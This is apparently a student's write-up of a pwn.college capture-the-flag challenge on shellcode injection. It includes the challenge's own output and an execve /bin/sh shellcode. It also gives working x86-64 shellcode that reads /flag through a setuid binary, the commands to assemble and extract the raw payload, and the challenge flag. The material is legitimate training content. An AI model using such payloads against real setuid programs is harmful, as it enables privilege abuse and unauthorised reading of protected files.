# Basic Shellcode

## Challenge
Write and execute shellcode to read the flag!

## Solve
**Flag:** `pwn.college{sDyTHL9jK4IlqtKlfvx_p6MuCB3.ddTMywyNyAzNzEzW}`

#### Gathering Info
In the `/challenge` directory, we are given 3 files:
- `DESCRIPTION.md`  
- `binary-exploitation-basic-shellcode`  
- `binary-exploitation-basic-shellcode.c`

Using the previous challenges' experience, I directly run the executable file to gather info. This way it is more convinient.
> The output:
```
###
### Welcome to /challenge/./binary-exploitation-basic-shellcode!
###

This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them
as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will
practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing
other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.

In this challenge, shellcode will be copied onto the stack and executed. Since the stack location is randomized on every
execution, your shellcode will need to be *position-independent*.

Allocated 0x1000 bytes for shellcode on the stack at 0x7fff00c36410!
Reading 0x1000 bytes from stdin.
```

#### Aim
- Inject the shellcode which will print out the `/flag` file.
- The shellcode must be injected in binary format.
- It needs to be **position independent** since the stack location is randomized on every execution.

#### Procedure
I first created an assembly file which simply opens a new shell which was taught in the introductory video. I though the flag would be printed out if I open a new terminal session. But that was not the case. Anyways, the code I used was this:
```asm
mov rax, 59
lea rdi, [rip+binsh]
mov rsi, 0
mov rdx, 0
syscall
binsh:
.string "/bin/sh"
```
- The code **59** is for `execve` function call. Its syntax is:
    - `execve(address, NULL, NULL)`
    - `execve` is a fundamental `system call` in Unix-like operating systems that is used to **execute a program**. Its primary purpose is to completely replace the current running program within a process with a new program.
- But after reading the explanation, I understood why this was not working.
    - First of all, it opens a new shell which is not what the challenge wants. It wants us to read the flag directly.
    - Second, there is a fundamental problem with this function which is it replaces the current instance of the program. Therefore, it will stop the program which is supposed to give the flag.
- After asking `SensAI` for guidance, I understood that I have to create a script which reads out the flag directly. Since the `suid` bin is set for this executable, it can read out the flag if I inject the shellcode to do so.
    - Open the flag file for reading using the `openat` syscall.
    - Read from the file into the buffer on the stack.
    - Write buffer to `stdout`.
    - Finally, exit cleanly.
- The code used to achieve the same is as follows:
```asm 
.global _start
.intel_syntax noprefix
_start:
  mov rax, 257                    
  mov rdi, -100                   
  lea rsi, [rip+flag]             
  xor rdx, rdx                    
  xor r10, r10                    
  syscall                         

  
  mov rdi, rax
  sub rsp, 0x100
  mov rsi, rsp
  mov rdx, 0x100
  xor rax, rax                    
  syscall                        


  mov rdx, rax
  mov rdi, 1
  mov rax, 1                      
  syscall

  mov rax, 60
  xor rdi, rdi
  syscall

flag:
  .asciz "/flag"
  ```
- The next step is to inject this shellcode into the challenge executable. This is taught in the introductory video. The procedure is as follows:
    - First write the shellcode and save it in `.s` file.
    - Assemble it using `gcc`:
        - `gcc -nostdlib -static payload.s -o payload-elf`
    - The above command returns an ELF with our shellcode as its `.text`. We still need to extract it.
        - `objcopy --dump-section .text=payload-raw payload-elf`
    - The resulting `payload-elf` file contains the raw bytes of the shellcode.
    - We inject this as part of the exploits.

## New Learnings
- `lea` calculates addresses.
    - `lea rbx, [eax+ecx]` will add the values in the corresponding registers and store it in `rbx`.
    - `mov` can't achieve the same since the syntax does not allow it.
        - `mov rbx, [eax+ecx]` is invalid.
        - We can technically achieve this using `mov` but is very complicated and this is the standard way to do this.
- we calculate relative address using `rip` pointer. This ensures we always point to the same location irrespective of the memory location where the program starts.
    - address calculation used: `lea rsi, [rip+flag]` will first calculate `disp` of between and `rip` and `flag` and then add it to `rip`. Thus, the statement essentially stores the address of `flag` into `rsi`.
    - This ensure relative addresssing and is a standard way to achieve it.


## Resources 
- [Shellcode Injection: Introduction](https://www.youtube.com/watch?list=PL-ymxv0nOtqomtHqMqqgpuvWdVSs9NCBK&time_continue=1753&v=715v_-YnpT8&embeds_referring_euri=https%3A%2F%2Fpwn.college%2F&source_ve_path=MjM4NTE)
- SensAI
